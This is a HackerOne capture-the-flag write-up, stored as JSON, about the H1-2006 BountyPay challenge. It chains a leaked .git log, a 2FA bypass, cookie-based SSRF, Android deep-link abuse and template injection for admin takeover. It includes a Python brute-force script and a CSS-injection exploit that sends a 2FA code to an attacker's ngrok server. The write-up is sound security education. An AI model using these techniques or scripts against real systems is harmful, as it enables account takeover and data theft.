{"id":894949,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTQ5NDk=","url":"https://hackerone.com/reports/894949","title":"[H1-2006 2020] Exploiting multiple vulnerabilities to get hacker's payment ensured","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-09T23:39:16.020Z","submitted_at":"2020-06-09T23:39:16.020Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hecsv17","url":"/hecsv17","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/iTZtwYanWLMA7Fw1o5fiKFav/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-06-18T15:25:13.183Z","bug_reporter_agreed_on_going_public_at":"2020-06-18T12:41:35.600Z","team_member_agreed_on_going_public_at":"2020-06-18T15:25:13.087Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Last week, Hackerone’s CEO Marten lost his credentials for BountyPay. A tweet from hackerone’s official twitter account asked for help from ethical hackers and bounty hunters to help the CEO recover his credentials and insure May’s payments.\nAs an active bug hunter on Hackerone, I decided to take on this challenge. Hey, in these times of pandemic induced quarantine, I can’t afford not to get payed for my BB hunting!\nPlus it’s a win-win: I get to get payed for my due bounties through the platform, and Marten gets the works done. And we can tweet the famous “togetherWeHitHarder” tweet again.\nSo let’s get this done.\n\n# Recon:\nAs per the usual, I started by doing a subdomain enumeration on `bountypay.h1ctf.com`, since the scope is wildcard and we want to have a vantage point on all the subdomains available on that target. That is how I discovered the five subdomains: www, app, staff, api and software.\nI started a visual recon alongside with content discovery on each one of the subdomains. From what I saw, I could make the following assumptions:\n1.\twww: is the main domain and doesn’t have any further access, it’s only for marketing and communication purposes;\n2.\tapi: a REST api with JSON output, that controls all BountyPay’s services in one place;\n3.\tstaff: is the area where BountyPay’s staff can login and communicate with each other;\n4.\tsoftware: is where the company shares useful software with its staff and customers and the access is IP-based;\n5.\tapp: is the main application where companies can log in and make bounty payments.\n\nFuzzing on all the subdomains returned no results (Bummer...), except for app.bountypay.h1ctf.com which exposes some juicy hidden git files. (Cha-ching!)\n{F861464}\n#The adventure starts:\nI downloaded all the files in the git directory, and found the following repository `https://github.com/bounty-pay-code/request-logger.git` in the config file.\nInside that repository, was a file named logger.php which stores data (IP, URI, METHOD and Params) from the server in a php array, which is then encoded by json then base64 and the output is stored in the `bp_web_trace.log` file.\nHence, the obvious next step: base64-decoding the said log file. And by doing so I came across a way in: thank you brian.oliver.\n{F861466}\nAfter successfully using the leaked credentials to login with brian, I hit 2FA.\nI tried to bypass this by sending any random ten characters alongside the challenge code inside the POST request, Miss.. \nSo I tried another approach: send any random characters with its correspondent MD5 hash, and apparently, the backend didn’t check for the validity nor the length of the sent code, it only validates if the challenge_answer parameter and the MD5 value of challenge field match.\n`Long story short: Bull’s eye !`\n{F861468}\n#Finding my way to Rome:\n\nBrowsing the application, I could only see that it shows the transactions made by the current user and those were sorted by month. \nI also noticed that a cookie named token is assigned to the session that i logged into. \nBy Base64-decoding this cookie, I find it is composed of two parts: `account_id` and hash which is NOT the MD5 hash of the provided account id. \nI tried to inject some SQL queries into the account_id parameter since there was a twitter account named @BountypayH advising to “always check for SQLi”. But no luck!\nI also noticed that sending any hash other than the one in the first request will not get any result back from the server.\n\nAt this point of the challenge I didn’t have more options to play with. So, I went back to the git repository and tried to get more information from it, but like a wise man once said, “been here, done that” so I quickly moved to test more hypothesis. \n\nThe `account_id` parameter seems to be random so I couldn’t predict or bruteforce any other valid value. \nBut reviewing Burp history, I noticed an interesting response from the server: when the transaction button is hit, the application makes a request to `api.bountypay.h1ctf.com` and gets the results of the user’s transactions at the following endpoint: `/api/accounts/F8gHiqSdpK/statements?month=01\u0026year=2020. `\n\nAt this stage, I started to play again with `account_id` value in order to understand how the api processes the input values. So I base64-encoded the following input: \u2028\n```{\"account_id\":\"F8gHiqSdpK/statements/?\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"} ```\n\u2028and sent it as the “token” cookie to “statements” endpoint. I got the following response: `\"data\":\"[\\\"Month and Year must be set\\\"]\"}`\n\nwhich indicates that I got my hands on some sort of an SSRF that can potentially give me access to the api without needing any credentials. \n\nHowever, since the account_id parameter is random, I couldn’t exploit it this way… \n\nFortunately, while doing the initial recon I had noticed that access to software subdomain is filtered by IP address (so it probably authorized requests from api). I also found a limited open redirect on api platform at redirect endpoint which redirects to `www.google.com` and some `bountypay.h1ctf.com` subdomains.\n To chain all this information, I had to check if I could hit redirect endpoint from statements endpoint at `app.bountypay.h1ctf.com`. After trial and error I managed to achieve this through the following input: ```{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/?\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"} ```\n{F861469}\n#Ciao Bella!\nAt this point I had access to software subdomain but it was protected by an authentication page, and since I couldn’t send credentials in GET requests, the only option I had left was to brute force files and directories to see if I could get unrestricted access to some resources.\nUsing the below python script, I was able to find uploads directory in which I found BountyPay.apk. Began the chapter “Attack on Android”..\n```\nfrom base64 import b64encode\nimport requests\nurl = \"https://app.bountypay.h1ctf.com/statements?year=2020\u0026month=04\"\ncookies = {}\nfor s in open('wordlist', 'r').read().split('\\n'):\n    token = '{\"account_id\":\"../../redirect?url=https://software.bountypay.h1ctf.com/%s?\",\"hash\":\"de235bffd23df6995ad4e0930baac1a2\"}' %s\n    token = b64encode(token)\n    cookies[\"token\"] = token\n    r = requests.get(url, cookies = cookies, verify=True)\n    if \"Not Found\" not in r.text:\n        print token\n        print r.text\n```\n#Attack on Android:\n\n##Part 1:\n\nI downloaded the apk file by visiting `https://software.bountypay.h1ctf.com/uploads/BountyPay.apk`\nWhen I ran the app on my Android, It offered no interesting content, I tried to capture traffic but nothing was going on, So I decided to dig deeper.\n\nI decompiled it using apktool, and read java code using Jd-GUI.\n\nAfter a close look at the app source code and the `AndroidManifest.xml`, I noticed three main activities, each of them are invoked through a particular scheme (one,two and three respectively), and all of which had a common host=part. \n\nAfter a user is registred to the app with her/his username and twitter handle, the MainActivity will create a user_created file and store this information in user shared preferences directory.\n\nThe code responsible for the validation of the first part is as below:\n```\nString str = getIntent().getData().getQueryParameter(\"start\");\n      if (str != null \u0026\u0026 str.equals(\"PartTwoActivity\") \u0026\u0026 sharedPreferences.contains(\"USERNAME\")) \n```\nThe first part is about sending a deep link which contains start as parameter and a value of PartTwoActivity.\n\nTo further inspect the contents of the app, I decided to host this code in my server and visited the link from my android device:\n```\n\u003chtml\u003e\n\u003cfont size=\"10\"\u003e\u003ccenter\u003e\u003ca href=\"one://part?start=PartTwoActivity\"\u003ehack them all\u003c/a\u003e\u003c/center\u003e\n\u003c/font\u003e\n\u003c/html\u003e\n```\nWhich led me to Part 2.\n\n##Part 2:\n\nFrom the PartTwoActivity’s source code I noticed that an intent is created and is waiting for two parameters to make its text visible. I visited the following page with those two parameters: `two=light` and `switch=on` \n```\n\u003chtml\u003e\n\u003cfont size=\"10\"\u003e\u003ccenter\u003e\u003ca href=\"two://part?two=light\u0026switch=on\"\u003ehack them all\u003c/a\u003e\u003c/center\u003e\n\u003c/font\u003e\n\u003c/html\u003e\n```\nAfter hitting this link, I could see an input text that expects a new value in order to validate this part (the provided value is the MD5 hash of “token” string). The `submitInfo` method has a listener on `childRef` instance which points to “header” value. On the same method, there is a public method named `onDataChange` which compares str1 and str2 strings and validate this part by writing “PARTTWO:COMPLETE” in created_user file. After entering “X-Token” value into the text field and hitting submit, Part 2 was validated.\n\n##Part 3:\nI noticed in `PartThreeActivity` that an intent is waiting for a base64 encoded values for three and switch parameters to be `UGFydFRocmVlQWN0aXZpdHk=` and `b24=` respectively. To validate this part, I needed to invoke `submitHash` method which will then invoke `correctHash` method that will trigger the `CongratsActivity`. The `submitHash` is waiting for the value of header which is no other than the value of “TOKEN” in created_user.xml file.\n```\ngeneric_x86:/data/data/bounty.pay/shared_prefs # cat user_created.xml                                                                                               \n\u003c?xml version='1.0' encoding='utf-8' standalone='yes' ?\u003e\n\u003cmap\u003e\n    \u003cstring name=\"PARTTWO\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"USERNAME\"\u003ehecsv\u003c/string\u003e\n    \u003cstring name=\"HOST\"\u003ehttp://api.bountypay.h1ctf.com\u003c/string\u003e\n    \u003cstring name=\"PARTONE\"\u003eCOMPLETE\u003c/string\u003e\n    \u003cstring name=\"TWITTERHANDLE\"\u003e@hecsv\u003c/string\u003e\n    \u003cstring name=\"TOKEN\"\u003e8e9998ee3137ca9ade8f372739f062c1\u003c/string\u003e\n\u003c/map\u003e\n```\nNow, let’s get serious.\n\n#Give to Marten what belongs to Marten:\n\n##Infiltrating the staff:\nAfter the Android surrendered the TOKEN, I used it to communicate with the REST api. That is how I discovered the “api/staff” endpoint which gave me info on two staff members: Sam and Brian. \nI changed GET to POST method to see when it could get me, but it returned  [\"Missing Parameter\"], which indicated that I needed another parameter to create a new staff member. The GET method gives me the name of the missing parameter: `name` and `staff_id`. \nBut even then, I couldn’t create any valid account since it was looking for a valid `staff_id` parameter. Then a hint from the CTF creators came to the rescue. Sandra Allison which is a newly recruited staff was very happy to join BountyPay company and her tweet offered us valuable information. Her badge was showing her staff id which was the missing piece of the puzzle.\n\nUsing her credentials, I was able to login to `https://staff.bountypay.h1ctf.com`\n{F861470}\n##Privilege escalation:\n\nAfter playing around with the staff application I figured I had the following options: updating the profile and avatar, contacting admin through support section but comments were disabled and reporting any page to the admin which will be visited by the admin (except if the page started with /admin). I have tried many attacks at this stage:\n×\tsending blind XSS payloads when reporting from all pages\n×\tmodifying avatar name to xss payloads (but good filters were implemented) \n×\tchanging my name to “admin” \n×\ttrying to report a page that will update my account’s rights to admin but without starting with admin endpoint `https://staff.bountypay.h1ctf.com/admin/report?url=Ly4uL0FETUlOL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJh`  (/../ADMIN/upgrade?username=sandra). \n\nAll of this was useless, so I had to change my approach. \n\nBack to the staff application, I found an interesting javascript file located at: `https://staff.bountypay.h1ctf.com/js/website.js`.\nA deep analysis of this file showed me that visiting `URL/#tab4` will load the hash location of that page and trigger any existing function on that page `($(\".tab4\").trigger(\"click\")))`. \nSince I wanted to trigger the `upgradeToAdmin` function, I needed a place to insert `tab4` and `upgradeToAdmin` so when I visited this page the function be triggered. Avatar name seemed like a good place to inject that payload since it will be reflected inside avatar class: ```\u003cdiv style=\"margin:auto\" class=\"avatar tab4 upgradeToAdmin\"\u003e\u003c/div\u003e```\n\nI then visited this link `https://staff.bountypay.h1ctf.com/#tab4` and indeed a GET request is sent to `admin/upgrade?username=undefined`. Here username is set to undefined because we don’t have a field with this name. After looking for a page that reflects username I discovered the following page: `https://staff.bountypay.h1ctf.com/?template=login\u0026username=sandra.allison`. \n\nAt this point, I needed to chain these two findings, so I tried to load the two templates (home and login) on the same page using the fact that query string accepts an array parameter. So, the following request did the trick for me: `https://staff.bountypay.h1ctf.com/?template[]=home\u0026template[]=login\u0026username=sandra.allison`\nFinally, to update Sandra’s rights to become an “admin” I sent following request: `https://staff.bountypay.h1ctf.com/?template[]=home\u0026template[]=login\u0026username=sandra.allison#tab4`\n{F861471}\nAfter I got admin access, I found Marten’s password stored in plaintext: `h\u0026H5wy2Lggj*kKn4OD\u0026Ype` \n\nYou’re welcome, Marten!\n\n#Injecting the uninjectable!\n\nAfter logging in with Marten password on `https://app.bountypay.h1ctf.com`, I bypassed the 2FA mechanism the same way as before. \nWow! I got a smile on my face, I can make the payment now and get the flag and the invite to h1-2006 event. Wait! A 2FA challenge again is needed to make the payment, my bad!\nWell, after some recon on that part I found that we had two minutes to send a seven-character long `challenge_answer`. Brute forcing here is not a wise option since we are in lack of resources and time. I tried to send a random string with its MD5 as challenge but the challenge seems to be far more complicated.\n\nI took a step back, and noticed that `app_style` parameter is sent with a POST request when we hit the “send challenge” button. I immediately fired up my VPS and got a hit from the server with the following `User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36`. \nA blind SSRF in this context seems to be not applicable. \nI took a close look at the CSS file that the application is loading when visiting that link, it’s applying some styles to the body and branding “div”. So, what if I host the same file but with different value in the background-color? \nThe response was unexpected, there were no changes applied to the background of the current page! So, I made the assumption that changes are happening server side. \nAfter doing some research I came across a nice article by `d0nut` explaining CSS injection attacks `(https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)`\nTo prove the existence of this vulnerability, I used the following css:\n``` \n*[class*=challenge]~*{\n        background:url(https://xyz.ngrok.io/challenge);\n}\n```\nThis code proves the existence of a class with name challenge.\nI needed to find the input that will contain the code that is generated by the server, I assumed that that input would start with “code” (since the challenge page is talking about sending a code) and sent the following CSS:\n```\ninput[name^=code]{\n        background:url(https://xyz.ngrok.io/code);\n}\n```\nAfter doing some brute force on the code name, I figured out that we have seven input in the form of `“code_X”` with X within [1-7].\n\n#The final exploit:\nI use the following python script to generate a css file that contains all possible alphanumeric strings combined with each code position and send them to the server, if a value exists for a particular code, the server will request our vps with `position/code_x_value`, then we parse our logs to get the whole code value . After getting the correct code,a POST request is sent through our proxy and a wonderful congratulation is printed back with the final ==FLAG=^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$==\n```\nimport string\nimport requests\nimport os, re\nfrom time import sleep\n\nngrok = \"https://3369b146412e.ngrok.io/\"\nurl = \"https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\"\ncookies = {\"token\":\"eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\"}\nproxies = {\"http\":\"http://localhost:8080\",\"https\":\"https://localhost:8080\"}\ncss_url = ngrok+\"tosend.css\"\ndata = {\"app_style\":css_url}\nnums = [0,1,2,3,4,5,6,7,8,9]\n\nalphanums = string.ascii_lowercase + string.ascii_uppercase + string.digits + \"+/=-_\u0026@*$ \"\n\nregex_challenge = 'name=\"challenge\" value=\"([a-zA-Z0-9]{32})\"'\nregex_timeout = 'name=\"challenge_timeout\" value=\"([0-9]+)\"'\n\nnum = [1,2,3,4,5,6,7]\n\ndef generate_css():\n    out = ''\n\n    payload4value = '''\n    input[name^=code_%i][value=\"%s\"]{\n        background: url(%s%s);\n    }'''\n\n    for i in num:\n\tfor j in alphanums:\n        \tout += payload4value %(i,j,ngrok+str(i)+\"/\",j)\n        \tout += '\\n'\n    \n    f=open('tosend.css','w')\n    f.write(out)\n    f.close()\n\ndef execute_attack():\n\tgenerate_css()\n\tr = requests.post(url, data=data, verify=True, cookies=cookies)\n\tsleep(5)\n\tcmd = 'tail -n7 /private/var/log/apache2/access_log |cut -d\" \" -f7 |sort \u003e/tmp/hh.txt \u0026\u0026 for i in `cat /tmp/hh.txt`; do echo $i |cut -d/ -f3;done| awk \"{print}\" ORS=\"\"'\n\tcode = os.popen(cmd).read()\n\t\n\tchallenge = re.search(regex_challenge, r.text).group(1)\n        timeout = re.search(regex_timeout, r.text).group(1)\n\tchallenge_data={\"challenge_timeout\":timeout, \"challenge\":challenge, \"challenge_answer\":code}\n        r = requests.post(url, data=challenge_data, verify=False, cookies=cookies, proxies=proxies)\n\nexecute_attack()\n```\n{F861472}\n\n## Impact\n\n#Finally\nI want to thank you for this amazing CTF, and looking forward to CTFs to come!","vulnerability_information_html":"\u003cp\u003eLast week, Hackerone’s CEO Marten lost his credentials for BountyPay. A tweet from hackerone’s official twitter account asked for help from ethical hackers and bounty hunters to help the CEO recover his credentials and insure May’s payments.\u003cbr\u003e\nAs an active bug hunter on Hackerone, I decided to take on this challenge. Hey, in these times of pandemic induced quarantine, I can’t afford not to get payed for my BB hunting!\u003cbr\u003e\nPlus it’s a win-win: I get to get payed for my due bounties through the platform, and Marten gets the works done. And we can tweet the famous “togetherWeHitHarder” tweet again.\u003cbr\u003e\nSo let’s get this done.\u003c/p\u003e\n\n\u003ch1 id=\"recon\"\u003eRecon:\u003c/h1\u003e\n\n\u003cp\u003eAs per the usual, I started by doing a subdomain enumeration on \u003ccode\u003ebountypay.h1ctf.com\u003c/code\u003e, since the scope is wildcard and we want to have a vantage point on all the subdomains available on that target. That is how I discovered the five subdomains: www, app, staff, api and software.\u003cbr\u003e\nI started a visual recon alongside with content discovery on each one of the subdomains. From what I saw, I could make the following assumptions:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e www: is the main domain and doesn’t have any further access, it’s only for marketing and communication purposes;\u003c/li\u003e\n\u003cli\u003e api: a REST api with JSON output, that controls all BountyPay’s services in one place;\u003c/li\u003e\n\u003cli\u003e staff: is the area where BountyPay’s staff can login and communicate with each other;\u003c/li\u003e\n\u003cli\u003e software: is where the company shares useful software with its staff and customers and the access is IP-based;\u003c/li\u003e\n\u003cli\u003e app: is the main application where companies can log in and make bounty payments.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eFuzzing on all the subdomains returned no results (Bummer...), except for app.bountypay.h1ctf.com which exposes some juicy hidden git files. (Cha-ching!)\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t4rihVB8WPhCR19aMGDdBgbC?response-content-disposition=attachment%3B%20filename%3D%22Picture1.png%22%3B%20filename%2A%3DUTF-8%27%27Picture1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=1a394bbf11994fa525d3c361106bcf7069fc3cce825d7a57a7041e3ba7fcb3e7\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t4rihVB8WPhCR19aMGDdBgbC?response-content-disposition=attachment%3B%20filename%3D%22Picture1.png%22%3B%20filename%2A%3DUTF-8%27%27Picture1.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=1a394bbf11994fa525d3c361106bcf7069fc3cce825d7a57a7041e3ba7fcb3e7\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"the-adventure-starts\"\u003eThe adventure starts:\u003c/h1\u003e\n\n\u003cp\u003eI downloaded all the files in the git directory, and found the following repository \u003ccode\u003ehttps://github.com/bounty-pay-code/request-logger.git\u003c/code\u003e in the config file.\u003cbr\u003e\nInside that repository, was a file named logger.php which stores data (IP, URI, METHOD and Params) from the server in a php array, which is then encoded by json then base64 and the output is stored in the \u003ccode\u003ebp_web_trace.log\u003c/code\u003e file.\u003cbr\u003e\nHence, the obvious next step: base64-decoding the said log file. And by doing so I came across a way in: thank you brian.oliver.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VswNw4hxpf7UeFLHX7KWnwnr?response-content-disposition=attachment%3B%20filename%3D%22Picture2.png%22%3B%20filename%2A%3DUTF-8%27%27Picture2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=446ba15eff2c971e33e0b9e9c5b1c41a8b16c392b8701b83522f4043a7daf595\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VswNw4hxpf7UeFLHX7KWnwnr?response-content-disposition=attachment%3B%20filename%3D%22Picture2.png%22%3B%20filename%2A%3DUTF-8%27%27Picture2.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvL